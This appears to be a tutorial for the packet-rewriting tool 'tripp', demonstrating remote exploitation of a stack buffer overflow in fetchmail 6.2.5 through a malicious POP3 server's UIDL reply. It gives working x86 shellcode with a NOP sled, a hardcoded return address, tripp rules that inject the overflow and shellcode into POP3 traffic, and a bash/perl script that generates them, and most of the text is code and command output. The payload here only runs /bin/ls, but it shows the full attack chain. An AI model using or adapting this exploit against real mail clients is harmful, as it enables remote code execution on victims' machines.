Remote exploiting through payload rewriting



This example shows how to use payload rewriting to exploit remote buffer
overflow vulnerabilities. 
In this case of study we'll analyze the classical buffer overflow wich can be 
triggered by passing a large amount of data when a small one is expected. 
Fetchmail 6.2.5 fails to perform an adequate boundary check on user-supplied 
input when it copies the output of the UIDL command into the stack so it can
lead to overflowing a finite-sized buffer. A malicious pop3 server could exploit 
this version of fetchmail by sending an especially crafted response to UIDL 
command containing an exploit-payload.


First lets take a look at a standard pop3d behaviour:

root@sd~# telnet pop3.papuasia.org 110
+OK Dovecot ready
user poplix
+OK 
pass dilithium
+OK logged in
STAT
+OK 8 7035
UIDL 1
+OK 1 0000685843e0fc41
quit


This is how pop3.papuasia.org responds to initial pop3 commands.





Exploiting fetchmail:

Now I'd like to spend a few words on the exploitation process. Due to the 
sscanf behaviour we cannot put our shellcode on the overflowed buffer, so we 
have to insert it into another memory area. A good place to save the shellcode 
is the buffer used to store the server banner. Here the server banner is 
"Dovecot ready" so we need to replace it with NOPs and shellcode. When shellcode 
is stored in memory, we're able to proceed with the exploitation process making 
eip point to our code.
Note that if there are less that 8 mails on the server, fetchmail will not call
the vulnerable function.


Here is pop3.papuasia.org patched to be able to exploit fetchmail:

root@sd~# telnet pop3.papuasia.org 110
+OK <NOP NOP NOP .... shellcode>
user poplix
+OK
pass dilithium
+OK logged in
STAT
+OK 8 7035
UIDL 1
+OK 1 <AAAAAAAAAAAAAAAAAAAAAAAAA...RET>
quit


It sounds like a really strange behaviour for a pop3 server... lets try it
against fetchmail

root@sd~# cat .fetchmailrc
poll pop3.papuasia.org protocol pop3 username "poplix" password "dilithium"

root@sd~/fetchmail-6.2.5# ./fetchmail --fastuidl 1 -k

As we can see, this malicious pop3 server has succesfully exploited fetchmail 
making this vulnerable program execute /bin/ls. Now the idea is to use 
payload rewriting to perform the same task. In order to do that we have to
confiure tripp to rewrite parts of our pop3 session's payload. First we 
need to repalace the first occurrence of "Dovecot" with the shellcode and then
replace the UID of the first mail (0000685843e0fc41) with our exploit-payload.


#Beginning of tripp rules file used to exploit fetchmail 6.2.5

OUT ( tcp.sport = '110' ) rewrite payload (
'Dovecot'=
'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x1f\x5e\x89\x76\x08\x31\xc0
\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80
\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/ls'*1,
'0000685843e0fc41' =
'TTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTT
TTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTT
TTTTTTTTTTTTTTTTTTTTTTTTTTTTT\x1e\xd6\xff\xbf'*1
);



Now we should execute tripp on the pop3 server:

root@papuasia.org~# tripp -i eth0 -g 10.0.0.138 -f rules_file
rewriter for incoming traffic started
rewriter for outgoing traffic started


Lets check the pop3 behaviour:

root@sd~# telnet pop3.papuasia.org 110
+OK <NOP NOP NOP .... shellcode> ready
+OK
user poplix
+OK
pass dilithium
+OK logged in
UIDL 1
+OK 1 <TTTTTTTTTTTTTTTTTTTTTTTTTT...RET>
quit



Now we should be able to exploit fetchmail:

root@sd~#/fetchmail-6.2.5# ./fetchmail --fastuidl 1 -k
ABOUT-NLS          driver.c                 md5.h          rpa.c
COPYING            driver.o                 md5c.c         rpa.o

Eureka, we've succesfully exploited fetchmail with a standard pop3 server and 
one tripp's rule only.






Tripp rules:

With the rules file above we must know the mail UID in order to replace it with
the exploit-payload. Generally this is not a problem because we are the
mailserver owners, so we can get all UIDs. Anyway a better method consists in 
setting up an arbitrary payload instead of rewrite parts of it. As we can see,
the reply to "UIDL 1" command is "+OK 1 0000685843e0fc41\r\n", so we can
match any packets containing "+OK 1 " and then set its payload to 
"+OK 1 TTTTTTTTTTTTTTTT...RET\r\n". In the same manner we can match any packet
containing "Dovecot" (or equal to "+OK Dovecot ready\r\n") and set its payload 
to "+OK NOP NOP NOP....shellcode\r\n"


example:
OUT(tcp.sport='110', payload ^ 'Dovecot') set (payload = '+OK \x90\x90...\r\n');
OUT(tcp.sport='110', payload ^ '+OK 1 ') set (payload = '+OK 1 TTTTTT....\r\n');



It's also possible to run tripp on the same machine as fetchmail, in this case
the rewrite must be applied to the IN chain.






Payload generation:

A good way to generate the payload is using bash and perl. The rules file we 
used to exploit fetchmail has been generate with the following script:


#!/bin/bash

# IN to use on client machine; OUT to use on server machine
CHAIN="OUT"

#shellcode
SC="\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\
\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\
\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/ls"

#return addr 0xbfffd61e
RET="\x1e\xd6\xff\xbf"


#nops and shellcode
EXEC="$(perl -e 'print "\\x90"x100')$SC"

#overflow and return addr
OVERF="$(perl -e 'print "T"x172')$RET"

#UID of the first mail
FUID="0000685843e0fc41"


#write rules file that uses payload rewrite
echo "$CHAIN ( tcp.sport='110') rewrite payload(\
'$FUID'   = '$OVERF'*1,\
'Dovecot'= '$EXEC'*1);" > rules_file_rewrite


#write rules file that uses set payload
echo "$CHAIN(tcp.sport='110', payload ^ 'Dovecot')\
 set (payload = '+OK $EXEC\r\n');\
$CHAIN(tcp.sport='110', payload ^ '+OK 1 ')\
 set (payload = '+OK 1 $OVERF\r\n');" > rules_file_set


#EOF



Anyway it's possible to lunch tripp directly from the script:

tripp -i eth0 -g 10.0.0.138 -r "$CHAIN ( tcp.sport='110') rewrite payload(\
'$FUID'   = '$OVERF'*1,\
'Dovecot'= '$EXEC'*1);"
